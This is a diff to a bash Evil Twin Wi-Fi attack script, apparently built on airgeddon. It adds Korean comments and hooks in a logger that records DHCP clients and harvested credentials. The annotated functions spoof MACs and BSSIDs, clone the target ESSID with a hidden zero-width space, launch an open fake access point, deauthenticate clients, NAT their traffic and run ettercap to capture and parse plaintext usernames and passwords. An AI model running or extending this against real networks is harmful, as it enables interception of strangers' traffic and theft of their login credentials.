@@ -18,6 +18,19 @@ fi
 # tr -d '\r'로 \r을 제거한 뒤 소싱하면 어떤 OS에서 편집해도 정상 동작.
 source <(tr -d '\r' < "${_config_file}")
 
+# --- 로거 로드 ---
+_logger_file="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/et_logger.sh"
+if [ -f "${_logger_file}" ]; then
+	# shellcheck source=et_logger.sh
+	source <(tr -d '\r' < "${_logger_file}")
+else
+	echo "[!] et_logger.sh not found, logging disabled." >&2
+	function log_init()             { :; }
+	function log_start_dhcp_monitor() { :; }
+	function log_credentials()      { :; }
+	function log_finalize()         { :; }
+fi
+
 # --- 이 스크립트 고유의 DoS 방식 (config 값을 덮어씀) ---
 et_dos_attack="Aireplay"
 
@@ -139,6 +152,7 @@ function language_strings() { :; }
 # 헬퍼 함수
 # ============================================================
 
+# /etc/os-release로 배포판을 감지해 xterm 창 크기 비율(xratio, yratio 등)을 배포판별로 설정
 function detect_distro_window_ratios() {
 	debug_print
 	local distro_id=""
@@ -198,6 +212,7 @@ function add_contributing_footer_to_file() {
 	} >> "${1}"
 }
 
+# sysfs symlink을 읽어 네트워크 인터페이스($1)에 대응하는 물리 phy 번호(예: phy0)를 반환
 function physical_interface_finder() {
 	debug_print
 	local phy_iface
@@ -205,6 +220,8 @@ function physical_interface_finder() {
 	echo "${phy_iface}"
 }
 
+# iw로 물리 인터페이스($1)의 채널 목록을 조회해 5GHz(5180 MHz) 지원 여부를 반환
+# 반환값: 0=지원·허용, 1=미지원, 2=지원하나 AIRGEDDON_5GHZ_ENABLED=false로 비활성화
 function get_5ghz_band_info_from_phy_interface() {
 	debug_print
 	if iw phy "${1}" channels 2> /dev/null | grep -Ei "5180(\.0)? MHz" > /dev/null; then
@@ -243,6 +260,7 @@ function disable_rfkill() {
 	fi
 }
 
+# airmon-ng 없이 iw 명령으로 인터페이스($1)를 monitor 또는 managed 모드로 전환
 function set_mode_without_airmon() {
 	debug_print
 	local error
@@ -263,6 +281,8 @@ function set_mode_without_airmon() {
 	return 0
 }
 
+# deauth 전용 모니터 인터페이스(mon0, mon1 …)를 생성하고 타겟 채널로 설정
+# Evil Twin AP와 별도 인터페이스를 사용해 deauth와 AP를 동시에 운용
 function prepare_et_monitor() {
 	debug_print
 	disable_rfkill
@@ -274,6 +294,8 @@ function prepare_et_monitor() {
 	iw dev "${iface_monitor_et_deauth}" set channel "${channel}" > /dev/null 2>&1
 }
 
+# 인터페이스($1)의 MAC을 /dev/urandom 기반 랜덤 값으로 교체하고 원래 MAC을 original_macs에 보관
+# LSB가 짝수인 주소를 생성해 유니캐스트 MAC만 사용되도록 보장
 function set_spoofed_mac() {
 	debug_print
 	current_original_mac=$(cat < "/sys/class/net/${1}/address" 2> /dev/null)
@@ -302,6 +324,8 @@ function get_hostapd_version() {
 	hostapd_version=$(hostapd -v 2>&1 | grep -oiP '^hostapd v\K[0-9]+\.[0-9]+')
 }
 
+# 타겟 BSSID($1)에서 6번째 바이트의 마지막 헥사 digit 하나를 다른 값으로 변경해 가짜 BSSID 생성
+# 원본 digit와 반드시 다른 값을 선택해 클라이언트가 다른 AP로 인식하도록 함
 function generate_fake_bssid() {
 	debug_print
 	local digit_to_change
@@ -315,6 +339,8 @@ function generate_fake_bssid() {
 	printf %s%X%s\\n "${1::10}" "${different_mac_digit}" "${1:11}"
 }
 
+# ESSID 끝에 Zero-Width Space(U+200B)를 삽입해 원본과 시각적으로 동일하지만 문자열이 다른 가짜 ESSID 생성
+# 클라이언트 목록에서 두 AP가 같은 이름처럼 보이게 해 deauth 후 재연결을 유도
 function generate_fake_essid() {
 	debug_print
 	if "${AIRGEDDON_EVIL_TWIN_ESSID_STRIPPING:-true}"; then
@@ -446,6 +472,8 @@ function get_tmux_process_id() {
 	fi
 }
 
+# AIRGEDDON_WINDOWS_HANDLING 설정에 따라 명령을 xterm 창 또는 tmux 윈도우에서 실행
+# $1: xterm 파라미터(크기·색상), $2: 실행 명령, $3: 창 이름, $4: "active"면 포커스 이동
 function manage_output() {
 	debug_print
 	local xterm_parameters
@@ -531,6 +559,8 @@ function is_first_routing_modifier_airgeddon_instance() {
 	return 1
 }
 
+# ip_forward 상태를 오케스트레이터 파일에 저장(start)하거나 원래 값으로 복원(end)
+# 여러 airgeddon 인스턴스가 동시 실행될 때 마지막 ET 인스턴스가 종료될 때만 복원
 function control_routing_status() {
 	debug_print
 	local saved_routing_status_found=""
@@ -641,6 +671,8 @@ function prepare_iptables_nftables() {
 	fi
 }
 
+# 공격 시작(start) 시 인스턴스별 체인을 생성하고, 종료(end) 시 해당 체인만 또는 전체 룰을 정리
+# 인스턴스 이름(ag_$$)을 체인에 포함시켜 병렬 실행 시 다른 인스턴스 규칙과 충돌 방지
 function clean_initialize_iptables_nftables() {
 	debug_print
 	if [ "${1}" = "start" ]; then
@@ -692,6 +724,8 @@ function clean_tmpfiles() {
 	fi
 }
 
+# pgrep으로 자식 프로세스를 재귀적으로 찾아 리프부터 루트 순서로 모두 kill
+# 단순 kill만으로는 고아 프로세스가 남을 수 있어 트리 전체를 정리
 function kill_pid_and_children_recursive() {
 	debug_print
 	local parent_pid=""
@@ -720,6 +754,7 @@ function kill_dos_pursuit_mode_processes() {
 	sleep 1
 }
 
+# et_processes 배열에 등록된 모든 공격 프로세스(AP·DHCP·deauth·sniffer)를 종료
 function kill_et_windows() {
 	debug_print
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
@@ -871,6 +906,8 @@ pid_control_pursuit_mode() {
 	kill_dos_pursuit_mode_processes
 }
 
+# 가짜 AP용 hostapd.conf를 생성: 타겟과 유사한 가짜 BSSID·ESSID, 동일 채널, 암호화 없음(WPA=0)
+# hostapd 버전에 따라 802.11n/ac/ax/be 파라미터를 조건부로 추가
 function set_hostapd_config() {
 	debug_print
 	get_hostapd_version
@@ -910,6 +947,7 @@ function set_hostapd_config() {
 	fi
 }
 
+# NetworkManager를 중지한 뒤 hostapd로 가짜 AP를 실행하고 PID를 et_processes에 등록
 function launch_fake_ap() {
 	debug_print
 	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
@@ -960,6 +998,8 @@ function launch_fake_ap() {
 	sleep 3
 }
 
+# 가짜 AP 네트워크에 사용할 192.169.x.0/24 IP 대역을 계산
+# 기존 라우팅 테이블과 충돌하는 대역을 피해 세 번째 옥텟을 증가시키며 빈 대역을 선택
 function set_network_interface_data() {
 	debug_print
 	std_c_mask="255.255.255.0"
@@ -990,6 +1030,8 @@ function set_network_interface_data() {
 	et_range_stop="${first_octet}.${second_octet}.${third_octet}.100"
 }
 
+# set_network_interface_data에서 계산한 IP 대역으로 dhcpd.conf를 생성
+# AppArmor가 dhcpd를 제한하는 환경에서는 /etc/dhcp 등 허용된 경로로 파일을 복사
 function set_dhcp_config() {
 	debug_print
 	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
@@ -1043,6 +1085,8 @@ function set_dhcp_config() {
 	fi
 }
 
+# 가짜 AP 인터페이스에 게이트웨이 IP를 할당하고 iptables MASQUERADE로 클라이언트 트래픽을 인터넷으로 포워딩
+# ip_forward를 활성화하고 인스턴스별 체인에 NAT·필터 규칙을 추가
 function set_std_internet_routing_rules() {
 	debug_print
 	control_routing_status "start"
@@ -1066,6 +1110,8 @@ function set_std_internet_routing_rules() {
 	sleep 2
 }
 
+# dhcpd를 실행해 가짜 AP에 접속한 클라이언트에게 IP를 할당하고 출력을 clts.txt로 리다이렉트
+# clts.txt는 DHCP 클라이언트 IP·MAC 추적 및 로거의 DHCP 모니터에서 사용
 function launch_dhcp_server() {
 	debug_print
 	recalculate_windows_sizes
@@ -1082,6 +1128,8 @@ function launch_dhcp_server() {
 	sleep 2
 }
 
+# et_dos_attack 설정값(Aireplay·mdk4·Auth DoS)에 맞는 deauth 명령을 조립해 모니터 인터페이스에서 실행
+# dos_pursuit_mode=1이면 타겟 채널 변경을 추적하는 pursuit 모드로 동작
 function exec_et_deauth() {
 	debug_print
 	prepare_et_monitor
@@ -1126,6 +1174,8 @@ function exec_et_deauth() {
 	fi
 }
 
+# ettercap을 MitM 스니퍼로 실행해 가짜 AP를 통과하는 평문 크리덴셜을 캡처
+# ettercap_log=1이면 이진 로그(.eci)를 tmpdir에 저장해 종료 후 parse_ettercap_log에서 파싱
 function launch_ettercap_sniffing() {
 	debug_print
 	recalculate_windows_sizes
@@ -1144,6 +1194,8 @@ function launch_ettercap_sniffing() {
 	fi
 }
 
+# 컨트롤 창에서 실행될 bash 스크립트를 heredoc으로 생성
+# 스크립트는 1초 주기로 경과 시간과 DHCP 연결 클라이언트 목록을 화면에 갱신
 function set_et_control_script() {
 	debug_print
 	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
@@ -1241,6 +1293,8 @@ function write_et_processes() {
 	fi
 }
 
+# ettercap 이진 로그(.eci)를 etterlog로 파싱해 USER:/PASS: 항목을 텍스트 파일로 저장
+# 크리덴셜이 1개 이상이면 ettercap_logpath로 지정된 경로에 결과 파일을 복사
 function parse_ettercap_log() {
 	debug_print
 	echo
@@ -1274,6 +1328,8 @@ function parse_ettercap_log() {
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
 }
 
+# 모니터 인터페이스 삭제, IP 주소·라우트 제거 후 인터페이스를 et_initial_state로 복원
+# MAC 스푸핑이 적용된 경우 original_macs에 보관된 원래 MAC으로 되돌림
 function restore_et_interface() {
 	debug_print
 	echo
@@ -1309,6 +1365,7 @@ function restore_et_interface() {
 # 메인 함수
 # ============================================================
 
+# SIGINT/SIGTERM 핸들러: 프로세스 종료 → iptables 정리 → 인터페이스 복원 → 로그 저장 → 임시파일 삭제 순으로 실행
 function _et_cleanup() {
 	echo
 	echo "[*] Stopping Evil Twin attack..."
@@ -1324,13 +1381,18 @@ function _et_cleanup() {
 	if [ "${ettercap_log}" -eq 1 ]; then
 		echo "[*] Parsing ettercap log..."
 		parse_ettercap_log
+		log_credentials
 	fi
+	echo "[*] Saving logs..."
+	log_finalize
 	echo "[*] Cleaning up temp files..."
 	clean_tmpfiles "exit_script"
 	echo "[+] Cleanup complete."
 	exit 0
 }
 
+# 메인 공격 함수: 가짜 AP → DHCP → 라우팅 → deauth → ettercap 스니퍼 → 컨트롤 창 순으로 실행
+# Ctrl+C 수신 시 _et_cleanup으로 모든 컴포넌트를 안전하게 종료
 function exec_et_sniffing_attack() {
 	debug_print
 	trap '_et_cleanup' SIGINT SIGTERM
@@ -1361,6 +1423,7 @@ function exec_et_sniffing_attack() {
 	echo "[*] Launching DHCP server..."
 	launch_dhcp_server
 	echo "[+] DHCP server running."
+	log_start_dhcp_monitor
 
 	echo "[*] Starting deauth attack (${et_dos_attack}) on ${bssid}..."
 	exec_et_deauth
@@ -1416,6 +1479,7 @@ echo "[*] Window ratios set (xratio=${xratio}, yratio=${yratio})"
 
 mkdir -p "${tmpdir}"
 echo "${agpid_to_use}" > "${system_tmpdir}${ag_orchestrator_file}"
+log_init
 
 echo "[*] Checking interface band support..."
 check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
